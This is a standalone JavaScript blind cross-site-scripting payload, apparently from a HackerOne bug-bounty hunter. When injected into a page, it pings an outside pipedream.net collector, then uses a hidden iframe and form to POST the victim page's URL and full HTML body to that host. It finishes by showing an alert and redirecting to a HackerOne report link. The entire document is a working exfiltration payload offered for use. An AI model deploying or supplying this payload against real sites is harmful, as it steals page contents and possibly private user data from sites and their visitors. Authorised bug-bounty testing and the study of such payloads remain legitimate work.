try {
  var elem = document.createElement('img');
elem.src = 'https://encq9kzbey4y.x.pipedream.net/BLIND_XSS_TRIGGERED';
document.body.appendChild(elem);
  
  //https://stackoverflow.com/a/6169703
  function Exfil(name, data) {
  // Add the iframe with a unique name
  var iframe = document.createElement("iframe");
  var uniqueString = "CHANGE_THIS_TO_SOME_UNIQUE_STRING";
  document.body.appendChild(iframe);
  iframe.style.display = "none";
  iframe.contentWindow.name = uniqueString;

  // construct a form with hidden inputs, targeting the iframe
  var form = document.createElement("form");
  form.target = uniqueString;
  form.action = "https://encq9kzbey4y.x.pipedream.net/exfil";
  form.method = "POST";

  // repeat for each parameter
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = name;
  input.value = data;
  form.appendChild(input);

  document.body.appendChild(form);
  form.submit();
  }
  
  Exfil("location", document.location.href);
  Exfil("html_code", document.body.innerHTML);
  
}catch(error) {  
}

try {
alert('PROOF -> Blind XSS HIT. This is proof from 0-1@HackerOne. Please contact your security team.');
document.location.href = "https://hackerone.com/reports/693776";
}catch(error) {}
